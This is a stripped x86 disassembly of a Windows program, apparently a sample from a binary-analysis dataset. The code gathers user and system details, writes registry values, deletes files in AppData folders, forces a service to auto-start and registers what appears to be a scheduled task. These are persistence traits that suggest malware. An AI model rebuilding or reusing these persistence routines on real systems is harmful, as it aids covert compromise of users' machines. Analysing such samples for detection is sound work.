mov [ esp + 0x8 ] 0x200
call [ GetUserNameW@IAT ]
call [ GetCommandLineW@IAT ]
xor ecx ecx
cmp [ eax + edx * 2 ] 0x0
je r-xdata
dec edx
or edx 0xfffffffe
inc edx
lea eax [ esp + 0x8 ]
push eax
call [ GetSystemTime@IAT ]
lea eax [ esp ]
push eax
lea eax [ esp + 0xc ]
push eax
call [ SystemTimeToFileTime@IAT ]
lea eax [ esp + 0x18 ]
push eax
call [ GetVersionExW@IAT ]
call sub_402a24
mov ecx [ ebp + 0x8 ]
push [ ebp + 0x10 ]
mov [ eax + 0x4a14 ] ecx
call sub_402a24
call sub_4045f1
xor eax eax
mov esp ebp
pop ebp
retn 0x10
add ecx 0xa
cmp ecx 0xc8
jl r-xdata
mov edx ecx
and edx 0x80000001
jns r-xdata
sub_4045f1
push ecx
push ebx
push esi
xor ebx ebx
cmp [ esp + 0x10 ] ebx
push edi
mov edi eax
je r-xdata
call sub_4044bc
test al al
je r-xdata
push r--data
push [ esp + 0x18 ]
call [ lstrcmpA@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
retn 0x4
call sub_401a38
call sub_403f04
mov esi edi
call sub_40299b
mov ebx edi
call sub_402804
xor ebx ebx
jmp r-xdata
push ebx
call sub_40107d
push eax
xor esi esi
call sub_401e94
test al al
je r-xdata
cmp [ edi + 0x4b64 ] bl
je r-xdata
push ebx
call [ ExitProcess@IAT ]
mov esi edi
call sub_4028cd
mov ecx edi
call sub_402029
test al al
jne r-xdata
call sub_402161
jmp r-xdata
push 0x1499700
call [ Sleep@IAT ]
sub_404683
push ebp
mov ebp esp
sub esp 0x41c
and [ ebp - 0x4 ] 0x0
push ebx
push esi
push edi
mov edi [ lstrcpyW@IAT ]
push r--data
lea eax [ ebp - 0x41c ]
push eax
call edi
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ ebp - 0x41c ]
push eax
call esi
push [ ebp + 0x8 ]
call sub_4035e6
cmp eax 0x28
jl r-xdata
xor al al
mov ebx r--data
push ebx
call sub_402d87
test eax eax
mov [ ebp - 0x8 ] eax
jne r-xdata
push 0x1
push rw-data
push [ ebp - 0x8 ]
mov ecx 0x532
call sub_40303c
test al al
je r-xdata
push ebx
call sub_402e41
test eax eax
mov [ ebp - 0x8 ] eax
je r-xdata
push [ ebp - 0x8 ]
call sub_40391f
push [ ebp - 0x4 ]
call sub_40391f
mov al 0x1
jmp r-xdata
push 0x1
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
test eax eax
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp + 0x8 ]
push 0x0
lea eax [ ebp - 0x41c ]
push eax
mov edx 0x80000001
call sub_40439e
push r--data
lea eax [ ebp - 0x214 ]
push eax
call edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x214 ]
push eax
call esi
push r--data
lea eax [ ebp - 0x214 ]
push eax
call esi
mov esi [ lstrlenW@IAT ]
lea eax [ ebp - 0x214 ]
push eax
call esi
lea ecx [ ebp - 0x41c ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
call sub_40107d
mov ebx eax
call sub_402519
mov [ ebp - 0x4 ] eax
push [ ebp - 0x4 ]
call esi
lea ecx [ ebp - 0x41c ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push r--data
mov eax ecx
push eax
push 0x80000002
call sub_404330
mov ebx [ lstrcpynW@IAT ]
mov edi 0x208
push edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
call ebx
lea eax [ ebp - 0x214 ]
push eax
call esi
lea ecx [ ebp - 0x41c ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push [ ebp - 0x4 ]
mov eax ecx
push 0x3
push r--data
push eax
push 0x80000002
call sub_404330
push edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
call ebx
lea eax [ ebp - 0x214 ]
push eax
call esi
lea ecx [ ebp - 0x41c ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push r--data
mov eax ecx
push eax
push 0x80000002
call sub_404330
push edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
mov [ ebp - 0xc ] 0x2
call ebx
lea eax [ ebp - 0x214 ]
push eax
call esi
lea eax [ ebp - 0x41c ]
test eax eax
je r-xdata
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push r--data
mov eax ecx
push eax
push 0x80000002
call sub_404330
push edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
mov [ ebp - 0xc ] 0x1
call ebx
lea eax [ ebp - 0x214 ]
push eax
call esi
lea eax [ ebp - 0x41c ]
test eax eax
je r-xdata
push 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x4
push r--data
lea eax [ ebp - 0x41c ]
push eax
push 0x80000002
call sub_404330
push edi
push r--data
lea eax [ ebp - 0x214 ]
push eax
call ebx
lea eax [ ebp - 0x214 ]
push eax
call esi
lea ecx [ ebp - 0x41c ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push 0x4
lea eax [ ebp - 0xc ]
push eax
push 0x4
push r--data
lea eax [ ebp - 0x41c ]
push eax
push 0x80000002
call sub_404330
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000002
call sub_404330
sub_40494d
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x61c
push ebx
push esi
push edi
push r--data
push [ ebp + 0xc ]
call sub_4023b7
test al al
je r-xdata
pop edi
pop esi
mov al 0x1
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x10 ]
add eax 0x2c
push r--data
push eax
mov [ esp + 0x14 ] eax
call [ lstrcmpW@IAT ]
test eax eax
mov edi [ lstrcpyW@IAT ]
mov esi [ lstrcatW@IAT ]
mov ebx r--data
je r-xdata
push [ ebp + 0xc ]
lea eax [ esp + 0x21c ]
push eax
call edi
push ebx
lea eax [ esp + 0x21c ]
push eax
call esi
push [ esp + 0xc ]
lea eax [ esp + 0x21c ]
push eax
call esi
lea eax [ esp + 0x218 ]
push eax
call [ DeleteFileW@IAT ]
push r--data
push [ esp + 0x10 ]
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x10
je r-xdata
push r--data
push [ esp + 0x10 ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
push [ ebp + 0xc ]
lea eax [ esp + 0x21c ]
push eax
call edi
push ebx
lea eax [ esp + 0x21c ]
push eax
call esi
push [ esp + 0xc ]
lea eax [ esp + 0x21c ]
push eax
call esi
push ebx
lea eax [ esp + 0x21c ]
push eax
call esi
push r--data
lea eax [ esp + 0x21c ]
push eax
call esi
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x424 ]
push eax
call edi
push 0x0
lea eax [ esp + 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push rw-data
lea eax [ esp + 0x18 ]
push eax
push 0x4c
pop ecx
call sub_40303c
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push rw-data
lea eax [ esp + 0x18 ]
push eax
mov ecx 0x1e2
call sub_40303c
lea eax [ esp + 0x420 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call edi
push ebx
lea eax [ esp + 0x21c ]
push eax
call esi
push r--data
lea eax [ esp + 0x21c ]
push eax
call esi
push 0x0
lea eax [ esp + 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push rw-data
lea eax [ esp + 0x18 ]
push eax
mov ecx 0x121
call sub_40303c
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push rw-data
lea eax [ esp + 0x18 ]
push eax
mov ecx 0xcc
call sub_40303c
lea eax [ esp + 0x420 ]
push eax
lea eax [ esp + 0x21c ]
push eax
call edi
push ebx
lea eax [ esp + 0x21c ]
push eax
call esi
push r--data
lea eax [ esp + 0x21c ]
push eax
call esi
push 0x0
lea eax [ esp + 0x21c ]
push eax
call [ CreateDirectoryW@IAT ]
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x0
push rw-data
lea eax [ esp + 0x18 ]
push eax
mov ecx 0x52f
call sub_40303c
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x0
push rw-data
lea eax [ esp + 0x18 ]
push eax
mov ecx 0x57f
call sub_40303c
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push rw-data
lea eax [ esp + 0x18 ]
push eax
push 0x7b
pop ecx
call sub_40303c
lea eax [ esp + 0x218 ]
push eax
lea eax [ esp + 0x14 ]
push eax
call edi
push ebx
lea eax [ esp + 0x14 ]
push eax
call esi
push r--data
lea eax [ esp + 0x14 ]
push eax
call esi
push 0x1
push 0x0
call sub_40107d
lea ecx [ esp + 0x18 ]
call sub_4031bc
push eax
call sub_40391f
push r--data
push [ esp + 0x10 ]
call [ lstrcmpW@IAT ]
test eax eax
jne r-xdata
sub_404cc2
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x66c
push ebx
push esi
push edi
push 0x1
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
mov ebx [ lstrlenW@IAT ]
mov esi eax
test esi esi
je r-xdata
push 0x0
push 0x1a
lea eax [ esp + 0x20 ]
push eax
push 0x0
call [ SHGetSpecialFolderPathW@IAT ]
test eax eax
mov edi [ lstrcpyW@IAT ]
jne r-xdata
push esi
call ebx
lea ecx [ eax + eax + 0x2 ]
xor edx edx
mov eax r--data
cmp edx eax
je r-xdata
mov esi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x1c ]
push eax
call esi
lea eax [ esp + 0x18 ]
push eax
mov [ esp + 0x14 ] 0xa
call ebx
lea eax [ esp + 0x18 ]
test eax eax
je r-xdata
push r--data
lea eax [ esp + 0x1c ]
push eax
call edi
push ecx
push esi
push 0x3
push r--data
push eax
push 0x80000001
call sub_404330
pop edi
pop esi
xor al al
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov ebx sub_40494d
cmp eax ebx
je r-xdata
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x224 ]
push eax
call edi
push r--data
lea eax [ esp + 0x224 ]
push eax
call esi
lea eax [ esp + 0x428 ]
push eax
lea eax [ esp + 0x224 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ esp + 0x14 ] eax
je r-xdata
test [ esp + 0x428 ] 0x10
jne r-xdata
push r--data
lea eax [ esp + 0x458 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push 0x0
lea eax [ esp + 0x42c ]
push eax
lea eax [ esp + 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_40494d
add esp 0x10
test al al
je r-xdata
lea eax [ esp + 0x428 ]
push eax
push [ esp + 0x18 ]
call [ FindNextFileW@IAT ]
test eax eax
jne r-xdata
push r--data
lea eax [ esp + 0x458 ]
push eax
call [ lstrcmpW@IAT ]
test eax eax
je r-xdata
push [ esp + 0x14 ]
call [ FindClose@IAT ]
jmp r-xdata
push 0x0
lea eax [ esp + 0x42c ]
push eax
lea eax [ esp + 0x20 ]
push eax
push [ ebp + 0x8 ]
call sub_40494d
add esp 0x10
test al al
je r-xdata
push 0x1
call [ Sleep@IAT ]
cmp [ esp + 0x10 ] 0x0
jle r-xdata
lea eax [ esp + 0x18 ]
push eax
lea eax [ esp + 0x224 ]
push eax
call edi
push r--data
lea eax [ esp + 0x224 ]
push eax
call esi
lea eax [ esp + 0x454 ]
push eax
lea eax [ esp + 0x224 ]
push eax
call esi
dec [ esp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push 0x0
push ebx
push 0x1
push 0x1
push [ esp + 0x20 ]
lea edx [ esp + 0x234 ]
call sub_402c0a
sub_404ec5
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x424
push ebx
push esi
push edi
xor esi esi
push r--data
mov [ esp + 0x18 ] esi
mov [ esp + 0x14 ] esi
call sub_402f8f
cmp eax esi
mov [ esp + 0x18 ] eax
jne r-xdata
push 0x1
push rw-data
push [ esp + 0x20 ]
mov ecx 0x4cc
call sub_40303c
test al al
je r-xdata
call sub_402ee4
cmp eax esi
mov [ esp + 0x18 ] eax
je r-xdata
push [ esp + 0x18 ]
call sub_40391f
push [ esp + 0x14 ]
call sub_40391f
push [ esp + 0x10 ]
call sub_40391f
mov al 0x1
jmp r-xdata
mov eax [ esp + 0x18 ]
push esi
push r--data
xor ecx ecx
call sub_4031bc
cmp eax esi
mov [ esp + 0x14 ] eax
je r-xdata
push esi
call sub_40391f
push esi
call sub_40391f
push esi
call sub_40391f
xor al al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
cmp eax esi
mov [ esp + 0x10 ] eax
jne r-xdata
push [ esp + 0x10 ]
mov esi [ lstrlenW@IAT ]
call esi
lea ecx [ eax + eax + 0x2 ]
xor edx edx
mov eax r--data
cmp edx eax
je r-xdata
call sub_40107d
mov ebx eax
call sub_402519
mov [ esp + 0x10 ] eax
mov ebx [ lstrcpyW@IAT ]
push r--data
lea eax [ esp + 0x22c ]
push eax
call ebx
mov edi [ lstrcatW@IAT ]
push r--data
lea eax [ esp + 0x22c ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x228 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push ecx
push [ esp + 0x14 ]
push 0x3
push r--data
push eax
push 0x80000002
call sub_404330
lea eax [ esp + 0x228 ]
push eax
lea eax [ esp + 0x24 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x24 ]
push eax
call edi
push [ esp + 0x14 ]
call esi
lea ecx [ esp + 0x20 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_404330
push r--data
call esi
lea ecx [ esp + 0x20 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push [ esp + 0x18 ]
mov eax ecx
push 0x1
push 0x0
push eax
push 0x80000000
call sub_404330
lea eax [ esp + 0x228 ]
push eax
lea eax [ esp + 0x24 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x24 ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x20 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push r--data
push 0x1
push r--data
mov eax ecx
push eax
push 0x80000000
call sub_404330
lea eax [ esp + 0x228 ]
push eax
lea eax [ esp + 0x24 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x24 ]
push eax
call edi
push r--data
call esi
lea ecx [ esp + 0x20 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_404330
push r--data
lea eax [ esp + 0x24 ]
push eax
call ebx
push r--data
lea eax [ esp + 0x24 ]
push eax
call edi
mov edi r--data
push edi
call esi
lea ecx [ esp + 0x20 ]
test ecx ecx
lea eax [ eax + eax + 0x2 ]
je r-xdata
push eax
push r--data
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000000
call sub_404330
lea eax [ esp + 0x20 ]
test eax eax
mov [ esp + 0x1c ] 0x1
je r-xdata
push eax
push edi
push 0x1
push 0x0
mov eax ecx
push eax
push 0x80000002
call sub_404330
push 0x4
lea eax [ esp + 0x20 ]
push eax
push 0x4
push r--data
lea eax [ esp + 0x30 ]
push eax
push 0x80000002
call sub_404330
sub_40518f
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ebx ebx
push edi
mov [ ebp - 0x4 ] ebx
call sub_4035e6
cmp eax 0x28
jl r-xdata
xor al al
push r--data
mov esi r--data
push esi
call sub_401f61
push r--data
push esi
mov [ rw-data ] eax
call sub_401f61
cmp [ rw-data ] ebx
mov [ rw-data ] eax
je r-xdata
cmp eax ebx
je r-xdata
push r--data
push ebx
push ebx
call eax
mov esi r--data
push esi
call sub_402d87
mov edi eax
cmp edi ebx
jne r-xdata
push 0x1
push rw-data
push edi
mov ecx 0x595
call sub_40303c
test al al
je r-xdata
push esi
call sub_402e41
mov edi eax
cmp edi ebx
je r-xdata
push edi
call sub_40391f
push [ ebp - 0x4 ]
call sub_40391f
mov al 0x1
jmp r-xdata
push 0x1
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
cmp eax ebx
mov [ ebp - 0x4 ] eax
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
push [ ebp - 0x4 ]
call [ lstrlenW@IAT ]
xor edx edx
mov ecx r--data
add eax eax
cmp edx ecx
je r-xdata
call sub_40107d
mov ebx eax
call sub_402519
mov [ ebp - 0x4 ] eax
xor ebx ebx
push r--data
call sub_401efb
cmp al bl
je r-xdata
push eax
push [ ebp - 0x4 ]
push 0x1
push r--data
push ecx
push 0x80000002
call sub_404330
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push ebx
mov [ ebp - 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] r--data
call [ rw-data ]
sub_4052c0
push ebp
mov ebp esp
sub esp 0x1c
push esi
push edi
push 0x1
xor esi esi
push esi
push esi
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
jne r-xdata
push ebx
push 0x14
push r--data
push edi
call [ OpenServiceW@IAT ]
push edi
mov edi [ CloseServiceHandle@IAT ]
mov ebx eax
call edi
cmp ebx esi
jne r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
test eax eax
jne r-xdata
xor eax eax
pop edi
pop esi
leave
retn
cmp [ ebp - 0x18 ] 0x4
jne r-xdata
push ebx
call edi
mov eax esi
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push 0xffffffff
push 0x2
push 0xffffffff
push ebx
call [ ChangeServiceConfigW@IAT ]
push esi
push esi
push ebx
call [ StartServiceW@IAT ]
test eax eax
jne r-xdata
xor esi esi
inc esi
jmp r-xdata
pop ebx
jmp r-xdata
sub_405347
push ebp
mov ebp esp
sub esp 0x48
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_4035e6
cmp eax 0x28
jl r-xdata
xor al al
call sub_4052c0
test eax eax
je r-xdata
push 0x0
call [ CoInitialize@IAT ]
test eax eax
jl r-xdata
lea eax [ ebp - 0xc ]
push eax
push r--data
xor ebx ebx
inc ebx
push ebx
push 0x0
push r--data
call [ CoCreateInstance@IAT ]
test eax eax
jge r-xdata
push ebx
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
test eax eax
mov [ ebp - 0x10 ] eax
je r-xdata
call [ CoUninitialize@IAT ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
mov edi r--data
push edi
mov esi r--data
push esi
push eax
call [ ecx + 0x18 ]
test eax eax
jge r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x0
mov esi r--data
push esi
push eax
call [ ecx + 0x78 ]
test eax eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jge r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
lea edx [ ebp - 0x8 ]
push edx
push edi
push r--data
push esi
push eax
call [ ecx + 0x20 ]
test eax eax
jge r-xdata
mov edi [ ebp - 0x10 ]
push edi
push eax
call [ ecx + 0x80 ]
test eax eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jge r-xdata
push eax
call [ ecx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
push [ ebp - 0x10 ]
push esi
push eax
call [ ecx + 0x88 ]
test eax eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jl r-xdata
push eax
push esi
push eax
call [ ecx + 0x90 ]
test eax eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jl r-xdata
call sub_40391f
jmp r-xdata
push 0xffffffff
push eax
call [ ecx + 0xa8 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push 0x20
push eax
call [ ecx + 0x98 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
lea edx [ ebp - 0x14 ]
push edx
lea edx [ ebp - 0x4 ]
push edx
push eax
call [ ecx + 0xc ]
test eax eax
jge r-xdata
push 0x2e
pop ecx
lea eax [ ebp - 0x48 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jmp r-xdata
mov [ eax ] 0x0
inc eax
dec ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
lea edx [ ebp - 0x48 ]
push edx
mov [ ebp - 0x3e ] 0x80c
mov [ ebp - 0x3c ] bx
mov [ ebp - 0x3a ] bx
mov [ ebp - 0x36 ] 0x2d
mov [ ebp - 0x34 ] 0xa
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x40 ] bx
mov [ ebp - 0x42 ] bx
mov [ ebp - 0x44 ] 0x7d0
mov [ ebp - 0x48 ] 0x2e
mov [ ebp - 0x28 ] 0x6
mov [ ebp - 0x38 ] 0x13
mov [ ebp - 0x24 ] bx
mov ecx [ eax ]
push eax
call [ ecx + 0xc ]
mov esi eax
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test esi esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
jl r-xdata
lea edx [ ebp - 0x18 ]
push edx
push r--data
push eax
call [ ecx ]
test eax eax
jl r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
push ebx
push 0x0
push eax
call [ ecx + 0x18 ]
mov esi eax
mov eax [ ebp - 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
test esi esi
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
jl r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
push edi
jmp r-xdata
call [ ecx + 0x30 ]
test eax eax
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
push eax
jl r-xdata
call [ ecx + 0x8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
push edi
call sub_40391f
mov al bl
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub_405581
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
and [ esp ] 0x0
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push edi
call sub_4035e6
cmp eax 0x28
jl r-xdata
xor al al
call sub_403f04
xor esi esi
inc esi
cmp eax esi
jl r-xdata
call sub_403f04
cmp eax 0x3
jge r-xdata
mov edi r--data
push edi
call sub_402d87
test eax eax
mov [ esp + 0x14 ] eax
jne r-xdata
push esi
push rw-data
push [ esp + 0x1c ]
mov ecx 0x59b
call sub_40303c
test al al
je r-xdata
push edi
call sub_402e41
test eax eax
mov [ esp + 0x14 ] eax
je r-xdata
push [ esp + 0x14 ]
call sub_40391f
push [ esp + 0xc ]
call sub_40391f
push esi
push r--data
call sub_40107d
xor ecx ecx
call sub_4031bc
test eax eax
mov [ esp + 0xc ] eax
jne r-xdata
mov al 0x1
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ esp + 0xc ]
call [ lstrlenW@IAT ]
xor edx edx
mov ecx r--data
add eax eax
cmp edx ecx
mov ebx 0x80000002
je r-xdata
call sub_40107d
mov ebx eax
call sub_402519
xor esi esi
mov [ esp + 0xc ] eax
inc esi
mov [ esp + 0x10 ] esi
xor eax eax
mov esi r--data
cmp eax esi
je r-xdata
push eax
push [ esp + 0x10 ]
push esi
push r--data
push ecx
push ebx
call sub_404330
and [ esp + 0x10 ] 0x0
xor eax eax
cmp eax esi
je r-xdata
push 0x4
lea eax [ esp + 0x14 ]
push eax
push 0x4
push r--data
push esi
push ebx
call sub_404330
push edi
call [ lstrlenW@IAT ]
xor ecx ecx
cmp ecx esi
lea eax [ eax + eax + 0x2 ]
je r-xdata
push 0x4
lea eax [ esp + 0x14 ]
push eax
push 0x4
push r--data
push esi
push ebx
call sub_404330
mov edi rw-data
push eax
push edi
push 0x1
push r--data
push esi
push ebx
call sub_404330
add edi 0x8
cmp edi rw-data
jl r-xdata
push eax
push [ edi ]
push 0x1
push [ edi - 0x4 ]
push esi
push ebx
call sub_404330
push [ edi ]
call [ lstrlenW@IAT ]
xor ecx ecx
cmp ecx esi
lea eax [ eax + eax + 0x2 ]
je r-xdata
push [ esp + 0xc ]
call sub_40391f
sub_40571b
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x110
push esi
push edi
push 0x2580
call sub_4022cc
add eax 0x3840
imul eax eax 0x3e8
push 0x0
push eax
call [ SleepEx@IAT ]
jmp r-xdata
cmp [ esp + 0xc ] 0x5
jb r-xdata
mov ecx [ ebp + 0x8 ]
and [ esp + 0xc ] 0x0
lea eax [ esp + 0xc ]
push eax
lea eax [ esp + 0x14 ]
push eax
lea eax [ esp + 0x1c ]
push eax
push 0x702f3f00
call sub_4015fd
test al al
je r-xdata
push [ esp + 0x10 ]
call sub_40391f
lea eax [ esp + 0x18 ]
push eax
call sub_40234d
push r--data
lea eax [ esp + 0x1c ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x18 ]
push eax
call sub_402f8f
mov edi eax
test edi edi
je r-xdata
mov ecx [ esp + 0xc ]
push 0x1
push [ esp + 0x14 ]
push edi
call sub_40303c
test al al
je r-xdata
push edi
call sub_40391f
push 0x0
push edi
lea esi [ esp + 0x14 ]
call sub_401e94
sub_4057d1
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x108
push esi
push edi
lea eax [ esp + 0x10 ]
push eax
call sub_40234d
push r--data
lea eax [ esp + 0x14 ]
push eax
call [ lstrcatW@IAT ]
lea eax [ esp + 0x10 ]
push eax
call sub_402f8f
mov edi eax
test edi edi
je r-xdata
pop edi
mov al 0x1
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push rw-data
push edi
mov ecx 0xe691
call sub_40303c
test al al
je r-xdata
push edi
call sub_40391f
push 0x0
push edi
lea esi [ esp + 0x14 ]
call sub_401e94
sub_405839
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_415c04
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x58
push ebx
push esi
push edi
lea esi [ esp + 0x30 ]
call sub_401311
and [ esp + 0x6c ] 0x0
lea esi [ esp + 0x40 ]
call sub_401311
mov [ esp + 0x6c ] 0x1
lea esi [ esp + 0x50 ]
call sub_401311
mov [ esp + 0x6c ] 0x2
or [ esp + 0x18 ] 0xffffffff
and [ esp + 0x1c ] 0x0
mov [ esp + 0x21 ] 0x0
mov [ esp + 0x20 ] 0x1
mov [ esp + 0x6c ] 0x3
mov ebx [ lstrlenA@IAT ]
mov esi rw-data
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov esi rw-data
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov esi rw-data
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov esi rw-data
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov edi rw-data
push edi
call ebx
push edi
mov edi eax
lea eax [ esp + 0x34 ]
call sub_403a68
mov edi rw-data
push edi
call ebx
push edi
mov edi eax
lea eax [ esp + 0x34 ]
call sub_403a68
push esi
call ebx
mov edi eax
push esi
lea eax [ esp + 0x34 ]
call sub_403a68
mov eax [ ebp + 0x8 ]
mov [ esp + 0x24 ] 0x22fefe01
call sub_4033a2
push rw-data
push 0x2
mov [ esp + 0x30 ] eax
pop edi
lea eax [ esp + 0x54 ]
mov [ esp + 0x30 ] edx
call sub_403a68
push 0x1
push 0x14
lea esi [ esp + 0x58 ]
call sub_4039b5
mov eax [ esp + 0x50 ]
push 0x3f
add eax edi
lea esi [ esp + 0x28 ]
mov [ esp + 0x18 ] 0x4
pop ecx
movzx edi [ esi + 0x2 ]
